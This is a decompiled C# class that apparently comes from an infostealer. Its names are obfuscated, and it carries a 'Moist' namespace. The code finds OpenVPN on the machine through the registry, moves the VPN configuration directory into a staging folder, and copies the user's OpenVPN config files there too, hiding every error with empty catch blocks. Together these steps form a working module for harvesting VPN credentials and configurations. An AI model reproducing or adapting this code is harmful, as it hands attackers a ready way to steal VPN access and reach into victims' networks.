using System;
using System.IO;
using Microsoft.Win32;
using Moist;

// Token: 0x02000057 RID: 87
internal class Class24
{
	// Token: 0x0600023F RID: 575 RVA: 0x000126CC File Offset: 0x000108CC
	public static void smethod_0(string string_0)
	{
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			string[] subKeyNames = localMachine.OpenSubKey("SOFTWARE").GetSubKeyNames();
			foreach (string a in subKeyNames)
			{
				if (a == "OpenVPN")
				{
					Directory.CreateDirectory(string_0 + "\\VPN\\OpenVPN");
					try
					{
						string path = localMachine.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						directoryInfo.MoveTo(string_0 + "\\VPN\\OpenVPN");
						Class24.int_0++;
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.UserProfile + "\\OpenVPN\\config\\conf\\").GetFiles())
			{
				Directory.CreateDirectory(string_0 + "\\VPN\\OpenVPN\\config\\conf\\");
				fileInfo.CopyTo(string_0 + "\\VPN\\OpenVPN\\config\\conf\\" + fileInfo.Name);
			}
			Class24.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000240 RID: 576 RVA: 0x0000446C File Offset: 0x0000266C
	public Class24()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x04000103 RID: 259
	public static int int_0;
}
